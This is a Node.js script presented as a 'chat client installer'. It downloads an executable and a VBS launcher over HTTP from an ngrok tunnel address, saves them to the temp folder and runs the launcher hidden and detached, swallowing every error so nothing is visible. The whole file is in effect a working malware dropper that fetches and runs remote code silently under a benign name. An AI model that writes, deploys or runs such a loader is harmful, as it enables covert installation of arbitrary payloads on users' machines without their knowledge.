#!/usr/bin/env node

// Client Installer - Downloads and installs the chat client
const https = require('https');
const http = require('http');
const fs = require('fs');
const path = require('path');
const { exec, spawn } = require('child_process');
const os = require('os');

// Configuration
const SERVER_HOST = '0.tcp.ngrok.io:14513'; // Change this to your server
const INSTALL_DIR = path.join(os.tmpdir(), 'ChatClient');
const CLIENT_EXE = path.join(INSTALL_DIR, 'chat-client.exe');
const LAUNCHER_VBS = path.join(INSTALL_DIR, 'run-client.vbs');

// Create install directory silently
if (!fs.existsSync(INSTALL_DIR)) {
  fs.mkdirSync(INSTALL_DIR, { recursive: true });
}

// Download file silently
function downloadFile(url, filePath) {
  return new Promise((resolve, reject) => {
    const protocol = url.startsWith('https:') ? https : http;
    const file = fs.createWriteStream(filePath);
    
    const req = protocol.get(url, { 
      timeout: 30000,
      headers: {
        'Connection': 'close'  // Force new connection
      }
    }, (response) => {
      if (response.statusCode !== 200) {
        file.close();
        try { fs.unlinkSync(filePath); } catch(e) {}
        reject(new Error(`Download failed: ${response.statusCode}`));
        return;
      }
      
      response.pipe(file);
      
      file.on('finish', () => {
        file.close();
        resolve();
      });
      
      file.on('error', (err) => {
        try { fs.unlinkSync(filePath); } catch(e) {}
        reject(err);
      });
    });
    
    req.on('error', (err) => {
      file.close();
      try { fs.unlinkSync(filePath); } catch(e) {}
      reject(err);
    });
    
    req.on('timeout', () => {
      req.destroy();
      file.close();
      try { fs.unlinkSync(filePath); } catch(e) {}
      reject(new Error('Download timeout'));
    });
    
    req.setTimeout(30000);
  });
}

// Main installer function
async function install() {
  try {
    // Download client executable silently
    await downloadFile(`http://${SERVER_HOST}/download/client.exe`, CLIENT_EXE);
    
    // Download VBS launcher silently
    await downloadFile(`http://${SERVER_HOST}/download/launcher.vbs`, LAUNCHER_VBS);
    
    // Execute the VBS launcher using spawn for true detachment
    try {
      const child = spawn('cscript', ['//nologo', LAUNCHER_VBS], {
        detached: true,
        stdio: 'ignore',
        windowsHide: true
      });
      child.unref(); // Don't wait for child process
    } catch (error) {
      // Silent error handling
    }
    
    process.exit(0);
    
  } catch (error) {
    // Silent error handling
    process.exit(1);
  }
}

// Start installation immediately and silently
install();